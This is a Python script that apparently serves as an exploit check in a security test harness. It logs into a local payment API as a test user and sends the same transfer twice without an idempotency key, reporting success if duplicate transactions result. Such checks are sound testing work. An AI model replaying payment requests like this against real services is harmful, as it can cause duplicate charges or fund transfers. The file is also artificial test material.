import os, sys, json
import requests

BASE = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def out(msg):
    print(msg)
    sys.exit(0)

try:
    s = requests.Session()
    s.headers.update({'Content-Type': 'application/json'})
    r = s.post(f'{BASE}/api/auth/login', data=json.dumps({'Username':'alice','Password':'alice-pw'}), timeout=3)
    if r.status_code != 200:
        out(f'EXPLOIT_FAIL: login failed status={r.status_code}')
    try:
        token = r.json().get('token')
    except Exception:
        out('EXPLOIT_FAIL: login response not JSON')
    if not token:
        out('EXPLOIT_FAIL: no token returned from login')
    auth = {'Authorization': f'Bearer {token}'}
    body = json.dumps({'FromAccount':'alice','ToAccount':'bob','Amount':10.00})
    r1 = s.post(f'{BASE}/api/payments/transfer', data=body, headers=auth, timeout=3)
    r2 = s.post(f'{BASE}/api/payments/transfer', data=body, headers=auth, timeout=3)
    if r1.status_code != 200 or r2.status_code != 200:
        out(f'EXPLOIT_FAIL: transfer status codes r1={r1.status_code} r2={r2.status_code}')
    try:
        tx1 = r1.json().get('transaction_id')
        tx2 = r2.json().get('transaction_id')
    except Exception:
        out('EXPLOIT_FAIL: transfer response not JSON')
    if not tx1 or not tx2:
        out(f'EXPLOIT_FAIL: missing transaction_id tx1={tx1} tx2={tx2}')
    if tx1 != tx2:
        out(f'EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1={tx1} tx2={tx2}')
    else:
        out(f'EXPLOIT_FAIL: server deduplicated, tx1==tx2={tx1}')
except requests.RequestException as e:
    out(f'EXPLOIT_FAIL: request error {e.__class__.__name__}')
except Exception as e:
    out(f'EXPLOIT_FAIL: unexpected {e.__class__.__name__}: {e}')

